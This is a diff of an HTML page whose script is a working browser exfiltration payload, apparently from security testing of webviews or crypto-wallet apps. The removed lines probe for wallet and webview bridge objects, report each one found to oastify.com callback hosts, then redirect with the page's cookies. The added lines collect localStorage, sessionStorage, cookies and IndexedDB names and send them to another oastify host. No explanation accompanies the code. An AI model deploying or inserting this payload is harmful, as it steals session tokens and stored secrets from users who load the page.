@@ -1,16 +1,32 @@
   <html><body><script>
-  try{var x=new XMLHttpRequest();x.open("GET","https://ping.4nsi7oi3x4a3hro2zucm8imn9ef637kfnlrnyr01p.oastify.com",true);x.send();}catch(e){}
-  try{if(window.kcwallet){var a=new XMLHttpRequest();a.open("GET","https://bydpivta8blasyz9a1ntjpxuklqeeogaglrpae.oastify.com",true);a.send();}}catch(e){}
-  try{if(window.flutter_inappwebview){var b=new
-  XMLHttpRequest();b.open("GET","https://7iql2rd6s756cuj5ux7p3lhq4habyg90sjw0l.oastify.com",true);b.send();}}catch(e){}
-  try{if(window.KuCoin){var c=new
-  XMLHttpRequest();c.open("GET","https://kubridge.4nsi7oi3x4a3hro2zucm8imn9ef637kfnlrnyr01p.oastify.com",true);c.send();}}catch(e){}
-  try{if(window.JSInterface){var d=new
-  XMLHttpRequest();d.open("GET","https://jsint.4nsi7oi3x4a3hro2zucm8imn9ef637kfnlrnyr01p.oastify.com",true);d.send();}}catch(e){}
-  try{if(window.webkit){var e=new
-  XMLHttpRequest();e.open("GET","https://webkit.4nsi7oi3x4a3hro2zucm8imn9ef637kfnlrnyr01p.oastify.com",true);e.send();}}catch(e){}
-  setTimeout(function(){
-    var cookies = document.cookie || "none";
-    window.location = "https://4hmi1oc3r443bri2tu6m2ign3e99xbbplxpfe.oastify.com/?c=" + encodeURIComponent(cookies);
-  }, 3000);
+  var d="";
+  try{
+    var ls="LS:";
+    for(var i=0;i<localStorage.length;i++){
+      var k=localStorage.key(i);
+      ls+=k+"="+localStorage.getItem(k).substring(0,50)+"|";
+    }
+    d+=ls.substring(0,500);
+  }catch(e){d+="LS_ERR:"+e.message+";";}
+  try{
+    var ss="SS:";
+    for(var i=0;i<sessionStorage.length;i++){
+      var k=sessionStorage.key(i);
+      ss+=k+"="+sessionStorage.getItem(k).substring(0,50)+"|";
+    }
+    d+=ss.substring(0,300);
+  }catch(e){d+="SS_ERR:"+e.message+";";}
+  d+="CK:"+document.cookie+";";
+  try{
+    indexedDB.databases().then(function(dbs){
+      var idb="IDB:";
+      dbs.forEach(function(db){idb+=db.name+",";});
+      d+=idb;
+      doExfil();
+    });
+  }catch(e){d+="IDB_ERR;";doExfil();}
+  function doExfil(){
+    window.location="https://gyiui0tf8glfs3zea6nyjuxzkqqnepvxe5g5ru.oastify.com/?d="+encodeURIComponent(d.substring(0,1500));
+  }
+  setTimeout(function(){doExfil();},2000);
   </script></body></html>
